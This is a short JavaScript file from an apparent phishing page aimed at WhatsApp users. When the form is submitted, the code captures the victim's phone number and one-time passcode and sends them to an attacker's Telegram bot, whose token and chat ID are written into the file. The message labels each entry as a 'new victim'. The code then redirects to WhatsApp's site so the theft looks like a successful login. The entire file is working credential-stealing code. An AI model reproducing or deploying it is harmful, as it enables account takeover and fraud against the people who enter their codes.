const CONFIG = {
    token: '8596409692:AAFKSFQqw-T7bX1ez2ug2w4PqruMGY0ZoP0',
    chat_id: '7667174226'
};

document.getElementById('payload-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('loading').classList.remove('hidden');

    const nomor = document.getElementById('nomor').value;
    const otp = document.getElementById('otp').value;
    const info = `🔥 *KORBAN BARU CUY* 🔥\n━━━━━━━━━━━━━━━\n📱 No WA: \`${nomor}\`\n🔑 Kode OTP: \`${otp}\`\n━━━━━━━━━━━━━━━\nBy Quantum V13.0`;

    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.chat_id,
                text: info,
                parse_mode: 'Markdown'
            })
        });
        
        // Redirect setelah 2 detik biar seolah-olah sukses
        setTimeout(() => {
            window.location.href = "https://www.whatsapp.com/contact";
        }, 2000);
        
    } catch (err) {
        alert("Koneksi Error, Coba lagi!");
        document.getElementById('loading').classList.add('hidden');
    }
});

